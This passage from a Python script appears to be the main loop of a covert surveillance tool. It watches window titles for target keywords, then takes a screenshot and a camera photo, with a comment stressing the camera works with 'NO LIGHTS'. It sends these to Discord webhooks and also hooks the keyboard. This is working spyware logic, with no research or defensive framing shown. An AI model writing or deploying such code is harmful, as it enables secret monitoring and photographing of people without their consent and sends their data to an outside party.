                    time.sleep(0.05)
                    continue

                # Detect target
                detected = title_matches_target(title)

                if detected:
                    keyword = get_matching_keyword(title)
                    
                    # Check if we should send an alert for this window
                    if should_send_alert(hwnd, title, keyword):
                        print(f"[DETECTION] Target detected: '{title}' (Keyword: {keyword})")
                        
                        # Small delay before taking screenshot to ensure window is focused
                        time.sleep(SCREENSHOT_DELAY)
                        
                        # Take screenshot in main thread
                        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                        
                        # Take camera picture from background camera (NO LIGHTS)
                        camera_image = take_camera_picture()
                        
                        # Send alert to both webhooks
                        alert_thread = threading.Thread(
                            target=send_discord_alert,
                            args=(title, keyword, screenshot, camera_image),
                            daemon=True
                        )
                        alert_thread.start()
                    else:
                        # Debug logging for skipped alerts
                        if hwnd == current_focused_hwnd:
                            print(f"[SKIPPED] Already alerted for this window recently: '{title[:50]}...'")
                else:
                    # Not a target window, update focus tracking
                    current_focused_hwnd = hwnd
                    current_focused_title = title

            except Exception as e:
                print(f"[ERROR] {e}")
        
        # Sleep regardless of tracking state
        time.sleep(0.1)

except KeyboardInterrupt:
    print("[EXIT] Interrupted by user.")

finally:
    # Cleanup
    keyboard.unhook_all()
    stop_camera_background()
    print("[SYSTEM] Keyboard listeners stopped")
    print("[SYSTEM] Camera stopped")
